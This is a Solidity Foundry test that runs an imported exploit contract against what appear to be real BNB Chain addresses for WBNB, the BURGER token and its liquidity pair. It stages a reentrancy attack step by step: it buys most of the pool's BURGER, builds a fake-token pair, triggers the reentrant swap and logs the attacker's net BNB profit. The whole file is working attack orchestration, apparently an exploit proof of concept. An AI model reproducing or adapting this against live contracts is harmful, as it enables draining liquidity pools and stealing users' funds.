// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerExploit.sol";

contract BurgerTest2 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;
    address constant PLATFORM = 0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0;

    BurgerExploit exploit;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 3000 ether);
    }

    function test_aggressiveAttack() public {
        vm.startPrank(attacker);
        exploit = new BurgerExploit();

        // Check initial reserves
        address burgerWbnbPair = 0x7ac55ac530f2C29659573Bde0700c6758D69e677;
        (uint112 r0, uint112 r1,) = IDemaxPair(burgerWbnbPair).getReserves();
        emit log_named_uint("BURGER/WBNB BURGER reserve", r0);
        emit log_named_uint("BURGER/WBNB WBNB reserve", r1);

        // Setup with 2500 BNB (to buy most of the BURGER in the pool)
        exploit.step1_setup{value: 2500 ether}();

        // Buy a LOT of BURGER - spend 2000 WBNB
        exploit.step2_buyBurger(2000 ether);
        uint256 burgerBal = IERC20(BURGER).balanceOf(address(exploit));
        emit log_named_uint("BURGER bought", burgerBal);

        // Check reserves after buying
        (r0, r1,) = IDemaxPair(burgerWbnbPair).getReserves();
        emit log_named_uint("BURGER reserve after buy", r0);
        emit log_named_uint("WBNB reserve after buy", r1);

        // Create FakeToken/BURGER pair with majority of BURGER
        // Put most BURGER in the pair so the reentrancy can swap a lot
        uint256 burgerForPair = burgerBal / 2; // 50% for pair
        uint256 burgerToKeep = burgerBal - burgerForPair; // 50% for reentrancy swap
        exploit.step3_createPair(100 ether, burgerForPair);
        emit log_named_uint("BURGER in pair", burgerForPair);
        emit log_named_uint("BURGER kept for reentry", burgerToKeep);

        // Record balances
        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(exploit));
        emit log_named_uint("WBNB before attack", wbnbBefore);

        // Attack
        exploit.step4_attack(50 ether);

        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(exploit));
        emit log_named_uint("WBNB after attack", wbnbAfter);

        // Check remaining BURGER
        uint256 burgerRemaining = IERC20(BURGER).balanceOf(address(exploit));
        emit log_named_uint("BURGER remaining", burgerRemaining);

        // Unwrap and check profit
        exploit.step5_unwrap();
        uint256 finalBalance = attacker.balance;
        emit log_named_uint("Final attacker BNB", finalBalance);
        emit log_named_int("Net profit BNB", int256(finalBalance) - 3000 ether);

        vm.stopPrank();
    }
}
